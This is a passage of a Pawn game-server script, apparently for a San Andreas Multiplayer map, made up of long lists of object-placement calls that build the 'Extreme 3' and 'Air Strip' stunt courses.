	CreateSObject(18809,922.22,-2432.19,107.84,90.00,0.00,271.13,object_show_distance,0,world_challenges);
	CreateSObject(18842,872.55,-2433.28,107.84,-90.00,0.00,271.32,object_show_distance,0,world_challenges);
	CreateSObject(18809,1069.80,-2379.38,139.05,90.00,0.00,265.05,object_show_distance,0,world_challenges);
	CreateSObject(18842,1118.31,-2380.87,139.04,-90.00,0.00,271.32,object_show_distance,0,world_challenges);
	CreateSObject(18813,1182.97,-2381.35,108.86,0.00,0.00,0.00,object_show_distance,0,world_challenges);
	CreateSObject(18841,1198.99,-2381.18,74.19,0.00,-91.00,0.00,object_show_distance,0,world_challenges);
	CreateSObject(18826,1215.36,-2365.16,95.09,0.00,91.00,87.66,object_show_distance,0,world_challenges);
	CreateSObject(18841,1214.99,-2333.82,73.76,0.00,-91.00,273.77,object_show_distance,0,world_challenges);
	CreateSObject(18826,1215.36,-2365.16,95.09,0.00,91.00,87.66,object_show_distance,0,world_challenges);
	CreateSObject(18826,1197.97,-2319.91,94.07,0.00,91.00,187.67,object_show_distance,0,world_challenges);
	CreateSObject(18841,1183.48,-2338.03,73.76,0.00,-91.00,273.77,object_show_distance,0,world_challenges);
	CreateSObject(18826,1168.59,-2355.85,94.07,0.00,91.00,187.67,object_show_distance,0,world_challenges);
	CreateSObject(18840,1162.64,-2357.91,61.39,0.00,-46.00,0.00,object_show_distance,0,world_challenges);
	CreateSObject(18809,1264.27,-2466.69,78.89,90.00,0.00,0.00,object_show_distance,0,world_challenges);
	CreateSObject(18842,1264.28,-2416.88,78.87,-90.00,0.00,0.00,object_show_distance,0,world_challenges);
	CreateSObject(18809,1209.20,-2358.50,52.48,90.00,0.00,268.65,object_show_distance,0,world_challenges);
	CreateSObject(18809,1308.92,-2361.02,52.48,90.00,0.00,268.65,object_show_distance,0,world_challenges);
	CreateSObject(18840,1356.28,-2352.90,52.09,-89.00,-46.00,87.45,object_show_distance,0,world_challenges);
	CreateSObject(18809,1367.04,-2305.99,51.90,90.00,0.00,178.04,object_show_distance,0,world_challenges);
	CreateSObject(18842,1264.26,-2317.15,71.07,-96.00,0.00,0.00,object_show_distance,0,world_challenges);
	CreateSObject(18842,1264.26,-2317.15,71.07,-96.00,0.00,0.00,object_show_distance,0,world_challenges);
	CreateSObject(18842,1356.65,-2161.87,64.71,-96.00,0.00,190.66,object_show_distance,0,world_challenges);
	CreateSObject(18809,1264.25,-2267.66,65.86,84.00,0.00,0.00,object_show_distance,0,world_challenges);
	CreateSObject(18842,1369.01,-2258.29,54.51,-96.00,0.00,177.19,object_show_distance,0,world_challenges);
	CreateSObject(18809,1344.06,-2115.05,69.78,84.00,0.00,199.44,object_show_distance,0,world_challenges);
	CreateSObject(18842,1323.07,-2072.43,75.04,-96.00,0.00,212.96,object_show_distance,0,world_challenges);
	CreateSObject(18825,1253.30,-2048.65,60.32,0.00,0.00,0.00,object_show_distance,0,world_challenges);
	CreateSObject(18825,1274.38,-2048.73,60.32,0.00,0.00,179.51,object_show_distance,0,world_challenges);
	CreateSObject(18761,1263.97,-2043.95,63.51,0.00,0.00,0.00,object_show_distance,0,world_challenges);
	// Extreme 3
	CreateSObject(18809,-1512.55,214.58,-16.52,0.00,-90.00,28.39,object_show_distance,0,world_challenges);
	CreateSObject(18809,-1469.36,231.84,-16.52,0.00,-90.00,15.67,object_show_distance,0,world_challenges);
	CreateSObject(18809,-1421.39,245.30,-16.52,0.00,-90.00,15.67,object_show_distance,0,world_challenges);
	CreateSObject(18809,-1375.35,261.55,-16.52,0.00,-90.00,23.17,object_show_distance,0,world_challenges);
	CreateSObject(18809,-1331.51,282.70,-16.52,0.00,-90.00,28.27,object_show_distance,0,world_challenges);
	CreateSObject(18809,-1290.86,309.09,-16.52,0.00,-90.00,37.75,object_show_distance,0,world_challenges);
	CreateSObject(18809,-1253.33,339.83,-16.52,0.00,-90.00,40.87,object_show_distance,0,world_challenges);
	CreateSObject(18809,-1550.90,186.88,-16.52,0.00,-90.00,43.51,object_show_distance,0,world_challenges);
	CreateSObject(18809,-1215.65,372.44,-16.52,0.00,-90.00,40.87,object_show_distance,0,world_challenges);
	CreateSObject(18809,-1212.33,429.20,34.24,0.00,-90.00,37.33,object_show_distance,0,world_challenges);
	CreateSObject(18809,-1145.14,439.83,-16.52,0.00,-90.00,52.60,object_show_distance,0,world_challenges);
	CreateSObject(18809,-1121.39,481.00,-16.52,0.00,-90.00,67.33,object_show_distance,0,world_challenges);
	CreateSObject(18809,-1074.73,590.37,-22.20,0.00,-90.00,67.33,object_show_distance,0,world_challenges);
	CreateSObject(18809,-1101.83,527.60,-16.52,0.00,-90.00,67.33,object_show_distance,0,world_challenges);
	CreateSObject(18824,-1068.07,635.84,-22.19,90.00,0.00,200.54,object_show_distance,0,world_challenges);
	CreateSObject(18809,-1103.00,665.83,-22.20,0.00,-90.00,153.69,object_show_distance,0,world_challenges);
	CreateSObject(18809,-1147.76,687.98,-22.20,0.00,-90.00,153.69,object_show_distance,0,world_challenges);
	CreateSObject(18809,-1198.52,698.09,-51.03,0.00,-90.00,153.69,object_show_distance,0,world_challenges);
	CreateSObject(18826,-1094.13,659.21,20.98,-25.00,0.00,113.01,object_show_distance,0,world_challenges);
	CreateSObject(18809,-1192.51,710.09,-22.20,0.00,-90.00,153.69,object_show_distance,0,world_challenges);
	CreateSObject(18809,-1160.35,670.51,-51.03,0.00,-90.00,134.69,object_show_distance,0,world_challenges);
	CreateSObject(18809,-1160.35,670.51,-51.03,0.00,-90.00,134.69,object_show_distance,0,world_challenges);
	CreateSObject(18826,-1141.08,641.03,-36.61,-25.00,0.00,133.15,object_show_distance,0,world_challenges);
	CreateSObject(18809,-1171.06,660.83,-22.20,0.00,-90.00,136.91,object_show_distance,0,world_challenges);
	CreateSObject(18826,-1226.98,719.82,-36.61,-25.00,0.00,332.78,object_show_distance,0,world_challenges);
	CreateSObject(18809,-1209.83,688.03,-22.20,0.00,-90.00,152.90,object_show_distance,0,world_challenges);
	CreateSObject(18809,-1202.98,701.48,6.56,0.00,-90.00,157.10,object_show_distance,0,world_challenges);
	CreateSObject(18822,-1155.94,688.87,6.57,90.00,0.00,89.00,object_show_distance,0,world_challenges);
	CreateSObject(18824,-1109.78,685.87,6.56,90.00,0.00,244.22,object_show_distance,0,world_challenges);
	CreateSObject(18826,-1237.72,709.85,-7.81,-25.00,0.00,332.68,object_show_distance,0,world_challenges);
	CreateSObject(18826,-1114.35,673.44,20.98,-25.00,0.00,-69.00,object_show_distance,0,world_challenges);
	CreateSObject(18824,-1108.78,642.97,15.21,0.00,-55.00,113.46,object_show_distance,0,world_challenges);
	CreateSObject(18826,-1095.54,613.77,40.56,0.00,84.00,115.20,object_show_distance,0,world_challenges);
	CreateSObject(18826,-1082.63,586.21,18.53,0.00,-91.00,115.00,object_show_distance,0,world_challenges);
	CreateSObject(18826,-1089.29,562.26,37.68,0.00,87.00,35.05,object_show_distance,0,world_challenges);
	CreateSObject(18826,-1126.86,496.94,18.53,4.00,-89.00,40.00,object_show_distance,0,world_challenges);
	CreateSObject(18826,-1101.71,515.48,37.68,0.00,87.00,35.05,object_show_distance,0,world_challenges);
	CreateSObject(18826,-1095.06,539.38,18.53,0.00,-91.00,115.00,object_show_distance,0,world_challenges);
	CreateSObject(18826,-1151.81,476.91,37.68,0.00,87.00,35.05,object_show_distance,0,world_challenges);
	CreateSObject(18826,-1176.90,458.31,18.53,4.00,-89.00,40.00,object_show_distance,0,world_challenges);
	CreateSObject(18809,-1177.87,405.07,-16.52,0.00,-90.00,40.87,object_show_distance,0,world_challenges);
	CreateSObject(18809,-1283.43,364.97,34.24,0.00,-90.00,57.21,object_show_distance,0,world_challenges);
	CreateSObject(18809,-1251.89,399.02,34.24,0.00,-90.00,37.33,object_show_distance,0,world_challenges);
	CreateSObject(18809,-1310.26,323.32,34.24,0.00,-90.00,57.21,object_show_distance,0,world_challenges);
	CreateSObject(18809,-1367.87,245.25,34.24,0.00,-90.00,42.23,object_show_distance,0,world_challenges);
	CreateSObject(18809,-1337.12,281.57,34.24,0.00,-90.00,57.21,object_show_distance,0,world_challenges);
	CreateSObject(18809,-1404.81,211.73,34.24,0.00,-90.00,42.23,object_show_distance,0,world_challenges);
	CreateSObject(18809,-1481.60,155.29,34.24,0.00,-90.00,17.54,object_show_distance,0,world_challenges);
	CreateSObject(18809,-1441.68,178.27,34.24,0.00,-90.00,42.23,object_show_distance,0,world_challenges);
	CreateSObject(18809,-1608.01,116.13,25.27,0.00,-90.00,17.54,object_show_distance,0,world_challenges);
	CreateSObject(18809,-1547.17,134.81,30.27,0.00,-90.00,17.54,object_show_distance,0,world_challenges);
	CreateSObject(18809,-1655.43,101.16,25.27,0.00,-90.00,17.54,object_show_distance,0,world_challenges);
	CreateSObject(18809,-1743.20,64.25,25.27,0.00,-90.00,39.49,object_show_distance,0,world_challenges);
	CreateSObject(18809,-1703.03,86.11,25.27,0.00,-90.00,17.54,object_show_distance,0,world_challenges);
	CreateSObject(18809,-1775.24,29.96,57.13,0.00,-90.00,54.22,object_show_distance,0,world_challenges);
	CreateSObject(18826,-1795.56,1.73,41.19,0.00,0.00,54.21,object_show_distance,0,world_challenges);
	CreateSObject(18809,-1775.24,29.96,25.27,0.00,-90.00,54.22,object_show_distance,0,world_challenges);
	CreateSObject(18809,-1746.10,70.43,57.13,0.00,-90.00,54.22,object_show_distance,0,world_challenges);
	CreateSObject(18809,-1717.02,110.81,57.13,0.00,-90.00,54.22,object_show_distance,0,world_challenges);
	CreateSObject(18809,-1687.92,151.17,57.13,0.00,-90.00,54.22,object_show_distance,0,world_challenges);
	CreateSObject(18809,-1658.77,191.60,57.13,0.00,-90.00,54.22,object_show_distance,0,world_challenges);
	CreateSObject(18809,-1629.76,231.87,57.13,0.00,-90.00,54.22,object_show_distance,0,world_challenges);
	CreateSObject(18822,-1601.72,270.70,63.16,0.00,-70.00,233.81,object_show_distance,0,world_challenges);
	CreateSObject(18761,-1589.98,288.09,69.15,0.00,0.00,332.13,object_show_distance,0,world_challenges);
	CreateSObject(10444,-1573.52,141.69,-15.20,90.00,0.00,228.43,object_show_distance,0,world_challenges);
	CreateSObject(10444,-1565.87,152.74,-15.20,90.00,0.00,241.96,object_show_distance,0,world_challenges);
	CreateSObject(10444,-1564.95,159.04,-15.20,90.00,0.00,275.36,object_show_distance,0,world_challenges);
	CreateSObject(10444,-1597.47,165.54,-15.20,90.00,0.00,35.80,object_show_distance,0,world_challenges);
	CreateSObject(10444,-1585.76,172.10,-15.20,90.00,0.00,22.96,object_show_distance,0,world_challenges);
	CreateSObject(10444,-1579.50,172.89,-15.20,90.00,0.00,2.99,object_show_distance,0,world_challenges);
	CreateSObject(9831,-1579.46,140.18,-32.42,-83.00,0.00,135.34,object_show_distance,0,world_challenges);
	CreateSObject(9831,-1584.76,145.45,-32.42,-83.00,0.00,135.34,object_show_distance,0,world_challenges);
	CreateSObject(9831,-1590.00,150.72,-32.42,-83.00,0.00,135.34,object_show_distance,0,world_challenges);
	CreateSObject(9831,-1595.32,156.03,-32.42,-83.00,0.00,135.34,object_show_distance,0,world_challenges);
	CreateSObject(9831,-1600.57,161.28,-32.42,-83.00,0.00,135.34,object_show_distance,0,world_challenges);
	CreateSObject(9831,-1604.23,158.19,-15.31,185.00,0.00,127.46,object_show_distance,0,world_challenges);
	CreateSObject(9831,-1602.76,156.62,-15.31,185.00,0.00,127.28,object_show_distance,0,world_challenges);
	CreateSObject(9831,-1601.24,155.02,-15.31,185.00,0.00,127.40,object_show_distance,0,world_challenges);
	CreateSObject(9831,-1599.74,153.46,-15.31,185.00,0.00,127.22,object_show_distance,0,world_challenges);
	CreateSObject(9831,-1597.56,151.09,-15.31,185.00,0.00,126.98,object_show_distance,0,world_challenges);
	CreateSObject(9831,-1594.77,148.56,-15.31,185.00,0.00,127.22,object_show_distance,0,world_challenges);
	CreateSObject(9831,-1591.82,145.53,-15.31,185.00,0.00,127.28,object_show_distance,0,world_challenges);
	CreateSObject(9831,-1587.70,141.39,-15.31,185.00,0.00,127.28,object_show_distance,0,world_challenges);
	CreateSObject(9831,-1583.94,137.16,-15.31,185.00,0.00,127.16,object_show_distance,0,world_challenges);
	CreateSObject(9831,-1582.31,134.44,-15.31,185.00,0.00,127.28,object_show_distance,0,world_challenges);
	// Air Strip
	SetDynamicObjectMaterial(CreateSObject(16684, 329.86731, 2504.27808, 15.58630, 0.00000, 0.00000, 359.70590), 0, 17880, "landhub", "yardgrass1", 0xFF7FFF00);
	SetDynamicObjectMaterial(CreateSObject(16685, 32.94840, 2503.61719, 15.52630, 0.00000, 0.00000, 180.00000), 0, 17880, "landhub", "yardgrass1", 0xFF7FFF00);
	CreateSObject(7392,16.60238,2513.28857,20.09834,0.00000,0.00000,171.39496);
	CreateSObject(18809,8.33919,2543.90552,20.08439,0.00000,90.00000,0.00000);
	CreateSObject(18826,43.79179,2528.86353,25.48749,70.00000,180.00000,0.00000);
	CreateSObject(18826,22.79179,2528.86353,36.34989,70.00000,-180.00000,180.00000);
	CreateSObject(18809,58.28949,2543.76636,41.78039,0.00000,90.00000,0.00000);
	CreateSObject(18809,108.28949,2543.76636,41.78039,0.00000,90.00000,0.00000);
	CreateSObject(18809,158.28949,2543.76636,41.78039,0.00000,90.00000,0.00000);
	CreateSObject(18826,193.74210,2528.72437,36.37729,290.00000,180.00000,0.00000);
	CreateSObject(18809,158.24440,2513.82153,30.94679,0.00000,90.00000,180.00000);
	CreateSObject(18809,108.24440,2513.82153,30.94679,0.00000,90.00000,180.00000);
	CreateSObject(18826,72.79180,2498.77954,25.54369,-110.00000,-180.00000,180.00000);
	CreateSObject(18809,108.28951,2483.87671,20.11319,0.00000,90.00000,0.00000);
	CreateSObject(18809,158.28951,2483.87671,20.11319,0.00000,90.00000,0.00000);
	CreateSObject(18809,208.28951,2483.87671,20.11319,0.00000,90.00000,0.00000);
	CreateSObject(18809,258.28949,2483.87671,20.11319,0.00000,90.00000,0.00000);
	CreateSObject(18822,306.78949,2483.87671,26.90669,-180.00000,112.00000,0.00000);
	CreateSObject(18822,349.98749,2483.87671,49.74599,-180.00000,-68.00000,0.00000);
	CreateSObject(18809,398.53149,2483.87671,56.52259,0.00000,90.00000,0.00000);
	CreateSObject(18824,443.18079,2496.01709,56.52259,90.00000,0.00000,135.00000);
	CreateSObject(18809,455.20340,2540.68799,56.52259,0.00000,90.00000,90.00000);
	CreateSObject(18824,443.06290,2585.33740,56.52259,90.00000,0.00000,-135.00000);
	CreateSObject(18809,398.39200,2597.35986,56.52259,0.00000,90.00000,180.00000);
	CreateSObject(18822,349.89200,2597.35986,63.31609,-180.00000,112.00000,180.00000);
	CreateSObject(18809,310.65201,2597.35986,92.38369,0.00000,45.00000,180.00000);
	CreateSObject(18809,275.35202,2597.35986,127.68568,0.00000,45.00000,180.00000);
	CreateSObject(18822,236.19402,2597.35986,156.65538,-180.00000,-68.00000,180.00000);
	CreateSObject(18809,187.85202,2597.35986,163.43228,0.00000,90.00000,180.00000);
	CreateSObject(18809,137.85202,2597.35986,163.43228,0.00000,90.00000,180.00000);
	CreateSObject(18809,87.85202,2597.35986,163.43228,0.00000,90.00000,180.00000);
	CreateSObject(18809,37.85202,2597.35986,163.43228,0.00000,90.00000,180.00000);
	CreateSObject(18826,2.35202,2597.35986,147.52248,0.00000,180.00000,180.00000);
	CreateSObject(18809,37.85202,2597.35986,131.60689,0.00000,90.00000,0.00000);
	CreateSObject(18809,87.85202,2597.35986,131.60689,0.00000,90.00000,0.00000);
	CreateSObject(18809,137.85202,2597.35986,131.60689,0.00000,90.00000,0.00000);
	CreateSObject(18822,186.35202,2597.35986,124.81339,-180.00000,-112.00000,0.00000);
	CreateSObject(18809,225.59203,2597.35986,95.74579,0.00000,-45.00000,0.00000);
	CreateSObject(18822,264.75003,2597.35986,66.77609,-180.00000,68.00000,0.00000);
	CreateSObject(18826,298.82913,2593.31787,75.41299,-15.00000,0.00000,180.00000);
	CreateSObject(18826,277.75052,2585.09473,75.41299,-15.00000,0.00000,0.00000);
	CreateSObject(18809,313.03543,2581.05908,59.91299,0.00000,90.00000,0.00000);
	CreateSObject(18809,363.03543,2581.05908,59.91299,0.00000,90.00000,0.00000);
	CreateSObject(18826,398.48804,2566.01709,54.50990,290.00000,180.00000,0.00000);
	CreateSObject(18809,362.99033,2551.11426,49.07940,0.00000,90.00000,180.00000);
	CreateSObject(18809,312.99033,2551.11426,49.07940,0.00000,90.00000,180.00000);
	CreateSObject(18809,262.99033,2551.11426,49.07940,0.00000,90.00000,180.00000);
	CreateSObject(18809,212.99033,2551.11426,49.07940,0.00000,90.00000,180.00000);
	CreateSObject(18826,177.49033,2551.11426,64.98920,0.00000,180.00000,180.00000);
	CreateSObject(18809,212.99033,2551.11426,80.90479,0.00000,90.00000,0.00000);
	CreateSObject(18809,262.99033,2551.11426,80.90479,0.00000,90.00000,0.00000);
	CreateSObject(18809,312.99033,2551.11426,80.90479,0.00000,90.00000,0.00000);
	CreateSObject(18809,362.99033,2551.11426,80.90479,0.00000,90.00000,0.00000);
	CreateSObject(18826,398.44293,2566.15625,75.50169,-110.00000,-180.00000,0.00000);
	CreateSObject(18809,362.94522,2581.05908,70.07120,0.00000,90.00000,180.00000);
	CreateSObject(18824,318.29593,2568.91870,70.07120,90.00000,0.00000,-45.00000);
	CreateSObject(18809,306.27332,2524.24756,70.07120,0.00000,90.00000,-90.00000);
	CreateSObject(18809,306.27332,2474.24756,70.07120,0.00000,90.00000,-90.00000);
	CreateSObject(18809,306.27332,2424.24756,70.07120,0.00000,90.00000,-90.00000);
	CreateSObject(18809,306.27332,2374.24756,70.07120,0.00000,90.00000,-90.00000);
	CreateSObject(18826,306.27332,2338.74756,54.16140,0.00000,180.00000,-90.00000);
	CreateSObject(18809,306.27332,2374.24756,38.24580,0.00000,90.00000,90.00000);
	CreateSObject(18824,294.13281,2418.89697,38.24580,90.00000,0.00000,-135.00000);
	CreateSObject(18809,249.46191,2430.91943,38.24580,0.00000,90.00000,180.00000);
	CreateSObject(18809,199.46191,2430.91943,38.24580,0.00000,90.00000,180.00000);
	CreateSObject(18809,149.46191,2430.91943,38.24580,0.00000,90.00000,180.00000);
	CreateSObject(18809,99.46191,2430.91943,38.24580,0.00000,90.00000,180.00000);
	CreateSObject(18809,-0.53808,2430.91943,38.24580,0.00000,90.00000,180.00000);
	CreateSObject(18809,-50.53809,2430.91943,38.24580,0.00000,90.00000,180.00000);
	CreateSObject(18824,-95.18739,2443.05981,38.24580,90.00000,0.00000,45.00000);
	CreateSObject(18809,-107.20999,2487.73096,38.24580,0.00000,90.00000,90.00000);
	CreateSObject(18824,-95.06949,2532.38037,38.24580,90.00000,0.00000,-45.00000);
	CreateSObject(18809,-50.39859,2544.40283,38.24580,0.00000,90.00000,0.00000);
	CreateSObject(18826,-14.94599,2529.36084,43.64890,70.00000,180.00000,0.00000);
	CreateSObject(18809,-50.44369,2514.45801,49.07940,0.00000,90.00000,180.00000);
	CreateSObject(18809,-100.44370,2514.45801,49.07940,0.00000,90.00000,180.00000);
	CreateSObject(18822,-148.94370,2514.45801,55.87289,-180.00000,112.00000,180.00000);
	CreateSObject(18822,-192.14169,2514.45801,78.71220,-180.00000,-68.00000,180.00000);
	CreateSObject(18809,-240.68570,2514.45801,85.48879,0.00000,90.00000,180.00000);
	CreateSObject(18809,-290.68570,2514.45801,85.48879,0.00000,90.00000,180.00000);
	CreateSObject(18809,-340.68570,2514.45801,85.48879,0.00000,90.00000,180.00000);
	CreateSObject(18824,-385.33499,2526.59839,85.48879,90.00000,0.00000,45.00000);
	CreateSObject(18809,-397.35760,2571.26953,85.48879,0.00000,90.00000,90.00000);
	CreateSObject(18824,-409.49811,2615.91895,85.48879,90.00000,0.00000,-135.00000);
	CreateSObject(18809,-454.16901,2627.94141,85.48879,0.00000,90.00000,180.00000);
	CreateSObject(18824,-498.81830,2615.80103,85.48879,90.00000,0.00000,-45.00000);
	CreateSObject(18809,-510.84091,2571.12988,85.48879,0.00000,90.00000,-90.00000);
	CreateSObject(18809,-510.84091,2521.12988,85.48879,0.00000,90.00000,-90.00000);
	CreateSObject(18824,-498.70041,2476.48047,85.48879,90.00000,0.00000,45.00000);
	CreateSObject(18809,-454.02951,2464.45801,85.48879,0.00000,90.00000,0.00000);
	CreateSObject(18809,-404.02951,2464.45801,85.48879,0.00000,90.00000,0.00000);
	CreateSObject(18809,-354.02951,2464.45801,85.48879,0.00000,90.00000,0.00000);
	CreateSObject(18809,-304.02951,2464.45801,85.48879,0.00000,90.00000,0.00000);
	CreateSObject(18809,-254.02951,2464.45801,85.48879,0.00000,90.00000,0.00000);
	CreateSObject(18822,-205.52951,2464.45801,78.69529,-180.00000,-112.00000,0.00000);
	CreateSObject(18822,-162.33151,2464.45801,55.85599,-180.00000,68.00000,0.00000);
	CreateSObject(18809,-113.78751,2464.45801,49.07939,0.00000,90.00000,0.00000);
	CreateSObject(18822,-65.28751,2464.45801,42.28589,-180.00000,-112.00000,0.00000);
	CreateSObject(18822,-25.89886,2464.50439,22.50946,-180.00000,68.00000,0.00000);
	CreateSObject(7392,13.21462,2487.07202,20.26884,0.00000,0.00000,0.00000);
	CreateSObject(18809,49.46191,2430.91943,38.24580,0.00000,90.00000,180.00000);
	CreateSObject(16362,39.93651,2480.26611,18.45618,0.00000,0.00000,271.50543);
	CreateSObject(16362,42.29105,2512.44287,18.45618,0.00000,0.00000,271.50543);
	CreateSObject(16116,-73.52897,2496.20508,9.96959,0.00000,0.00000,298.53693);
	CreateSObject(16116,-73.81958,2521.01855,9.96959,0.00000,0.00000,298.53693);
	CreateSObject(18780,-42.42089,2490.18848,27.06863,0.00000,0.00000,185.06662);
	CreateSObject(18779,330.95142,2492.87720,25.21936,0.00000,0.00000,0.00000);
	CreateSObject(18450,271.81003,2498.97681,34.92255,0.00000,0.00000,0.00000);
	CreateSObject(18450,192.08949,2499.06689,34.91460,0.00000,0.00000,0.00000);
	CreateSObject(18777,151.68936,2479.15259,37.79420,0.00000,0.00000,87.88660);
	CreateSObject(18772,28.33850,2499.27979,63.78590,0.00000,0.00000,90.00000);
	CreateSObject(18776,-97.47308,2499.27588,64.28428,0.00000,0.00000,90.00000);
	CreateSObject(18835,463.43423,2408.96338,89.37667,0.00000,0.00000,0.00000);
	CreateSObject(18841,442.68619,2498.52100,98.62400,0.00000,0.00000,159.11571);
	CreateSObject(18842,409.33221,2510.26440,114.52300,0.00000,90.00000,341.09921);
	CreateSObject(18841,375.81351,2521.98657,130.41780,0.00000,0.00000,340.14929);
	CreateSObject(18842,409.33218,2510.26440,51.08980,0.00000,90.00000,341.09921);
	CreateSObject(18841,442.68622,2498.52100,35.22477,0.00000,0.00000,159.11566);
	CreateSObject(18842,409.33218,2510.26440,82.79295,0.00000,90.00000,341.09921);
	CreateSObject(18841,375.81354,2521.98657,66.96980,0.00000,0.00000,340.14926);
	CreateSObject(18839,407.48856,2506.65210,146.07492,90.00000,90.00000,140.41707);
	CreateSObject(18836,435.02701,2465.52539,145.96880,0.00000,0.00000,28.33730);
	CreateSObject(18783,464.10751,2409.44678,55.30788,0.00000,0.00000,356.66525);
	CreateSObject(9833,455.38660,2402.17798,60.65666,0.00000,0.00000,0.00000);
	CreateSObject(9833,456.29581,2417.94189,60.65666,0.00000,0.00000,0.00000);
	CreateSObject(18778,477.05713,2408.49219,59.23452,0.00000,0.00000,266.08102);
	CreateSObject(19128,464.38409,2409.38989,57.78403,0.00000,0.00000,356.10522);
	CreateSObject(1652,350.51910,2529.05054,16.30780,0.00000,0.00000,0.00000);
	CreateSObject(1652,379.57440,2529.07031,16.20380,0.00000,0.00000,0.00000);
	CreateSObject(1653,392.38953,2535.52100,16.20490,0.00000,0.00000,90.00000);
	CreateSObject(1653,392.38055,2543.50732,16.20490,0.00000,0.00000,90.00000);
	CreateSObject(1652,379.55411,2549.92358,16.20380,0.00000,0.00000,0.00000);
	CreateSObject(1652,353.95819,2549.91748,16.20390,0.00000,0.00000,0.00000);
	CreateSObject(1653,337.71823,2535.40967,16.20490,0.00000,0.00000,90.00000);
	CreateSObject(1653,337.71060,2543.41577,16.20490,0.00000,0.00000,90.00000);
	CreateSObject(1652,350.53238,2549.92334,16.20390,0.00000,0.00000,0.00000);
	CreateSObject(616,354.56332,2539.14502,15.39674,0.00000,0.00000,0.00000);
	CreateSObject(616,353.78864,2538.33765,15.39674,0.00000,0.00000,233.06287);
	CreateSObject(616,354.95590,2538.58862,15.39674,0.00000,0.00000,159.79973);
	CreateSObject(616,354.94052,2539.75488,15.39674,0.00000,0.00000,159.79973);
	CreateSObject(9833,354.63699,2539.26636,12.92738,0.00000,20.00000,0.00000);
	CreateSObject(9833,354.84180,2539.59302,12.92738,0.00000,20.00000,270.18124);
	CreateSObject(9833,355.20798,2539.21582,12.92738,0.00000,20.00000,177.77467);
	CreateSObject(9833,355.05038,2539.28076,12.92738,0.00000,20.00000,89.30824);
	CreateSObject(1652,350.57159,2529.06323,16.30780,0.00000,0.00000,180.00000);
	CreateSObject(1652,379.57440,2529.07031,16.20380,0.00000,0.00000,180.00000);
	CreateSObject(1653,392.38950,2535.52100,16.20490,0.00000,0.00000,270.00000);
	CreateSObject(1653,392.38062,2543.50732,16.20490,0.00000,0.00000,270.00000);
	CreateSObject(1652,379.55411,2549.92358,16.20380,0.00000,0.00000,180.00000);
	CreateSObject(1652,353.95819,2549.91748,16.20390,0.00000,0.00000,180.00000);
	CreateSObject(1652,350.53241,2549.92334,16.20390,0.00000,0.00000,180.00000);
	CreateSObject(1653,337.71060,2543.41577,16.20490,0.00000,0.00000,270.00000);
	CreateSObject(1653,337.71820,2535.40967,16.20490,0.00000,0.00000,270.00000);
	CreateSObject(616,355.80228,2539.83203,15.39674,0.00000,0.00000,159.79973);
	CreateSObject(616,355.88715,2538.78809,15.39674,0.00000,0.00000,159.79973);
	CreateSObject(616,355.29623,2540.39746,15.39674,0.00000,0.00000,242.24417);
	CreateSObject(616,355.11392,2540.52783,15.59442,0.00000,0.00000,54.89557);
	CreateSObject(616,353.41156,2538.86597,15.39674,0.00000,0.00000,242.24417);
	CreateSObject(616,354.43994,2540.36572,15.59442,0.00000,0.00000,54.89557);
	CreateSObject(19129,7.30030,2464.21533,15.42600,0.00000,0.00000,0.20100);
	CreateSObject(877,342.48502,2534.59229,16.67208,0.00000,0.00000,0.00000);
	CreateSObject(877,387.54803,2544.08496,16.67208,0.00000,0.00000,0.00000);
	CreateSObject(877,386.80057,2534.17944,16.67208,0.00000,0.00000,47.61848);
	CreateSObject(8991,377.09235,2549.35938,16.24279,0.00000,0.00000,0.00000);
	CreateSObject(8991,363.10623,2549.30225,16.24279,0.00000,0.00000,0.00000);
	CreateSObject(8991,349.88641,2549.36646,16.24279,0.00000,0.00000,0.00000);
	CreateSObject(8991,344.85236,2549.49292,16.24279,0.00000,0.00000,0.00000);
	CreateSObject(8991,384.57703,2529.58984,16.24280,0.00000,0.00000,180.00000);
	CreateSObject(8991,373.56973,2529.53784,16.24280,0.00000,0.00000,180.00000);
	CreateSObject(8991,355.49866,2529.58252,16.24280,0.00000,0.00000,180.00000);
	CreateSObject(8991,345.79428,2529.88965,16.24280,0.00000,0.00000,180.00000);
	CreateSObject(877,341.06833,2543.89478,16.67208,0.00000,0.00000,0.00000);
	CreateSObject(3515,366.78235,2528.88184,14.10976,0.00000,0.00000,0.00000);
	CreateSObject(7416,477.33981,2483.18994,15.38330,0.00000,0.00000,0.00000);
	CreateSObject(18778,432.77283,2515.03687,16.84592,0.00000,0.00000,270.56406);
	CreateSObject(18778,432.71933,2521.12158,16.84592,0.00000,0.00000,270.56406);
	CreateSObject(19076,403.68582,2454.30981,15.38796,0.00000,0.00000,0.00000);
	CreateSObject(6965,375.45822,2539.02344,18.33652,0.00000,0.00000,0.00000);
	CreateSObject(3935,375.32269,2539.16602,22.79870,0.00000,0.00000,3.08210);
	CreateSObject(18783,240.94740,2502.49927,17.73120,0.00000,180.00000,0.00000);
	CreateSObject(18784,260.82645,2502.44653,17.72502,0.00000,0.00000,179.59396);
	CreateSObject(18784,220.97630,2502.50854,17.72500,0.00000,0.00000,0.00000);
	CreateSObject(1225,246.71689,2509.08447,15.91431,0.00000,0.00000,0.00000);
	CreateSObject(1225,246.62222,2500.69531,15.91431,0.00000,0.00000,0.00000);
	CreateSObject(1225,245.26071,2504.71460,15.91431,0.00000,0.00000,0.00000);
	CreateSObject(1225,243.08044,2509.72485,15.91431,0.00000,0.00000,0.00000);
	CreateSObject(1225,240.74947,2505.85352,15.91431,0.00000,0.00000,0.00000);
	CreateSObject(1225,235.50128,2509.49658,15.91431,0.00000,0.00000,0.00000);
	CreateSObject(1225,234.88788,2506.13501,15.91431,0.00000,0.00000,0.00000);
	CreateSObject(1225,242.11536,2502.34717,15.91431,0.00000,0.00000,0.00000);
	CreateSObject(1225,234.71915,2500.41333,15.91431,0.00000,0.00000,0.00000);
	CreateSObject(1225,235.88446,2496.18750,15.91431,0.00000,0.00000,0.00000);
	CreateSObject(1225,240.38066,2495.96313,15.91431,0.00000,0.00000,0.00000);
	CreateSObject(1225,245.53021,2497.58667,15.91431,0.00000,0.00000,0.00000);
	CreateSObject(1225,248.83124,2510.48901,20.63050,0.00000,0.00000,0.00000);
	CreateSObject(1225,241.09703,2506.56006,20.63050,0.00000,0.00000,0.00000);
	CreateSObject(1225,237.12964,2510.50439,20.63050,0.00000,0.00000,0.00000);
	CreateSObject(1225,244.87439,2510.52197,20.63050,0.00000,0.00000,0.00000);
	CreateSObject(1225,240.79454,2510.48804,20.63050,0.00000,0.00000,0.00000);
	CreateSObject(1225,232.83063,2510.48022,20.63050,0.00000,0.00000,0.00000);
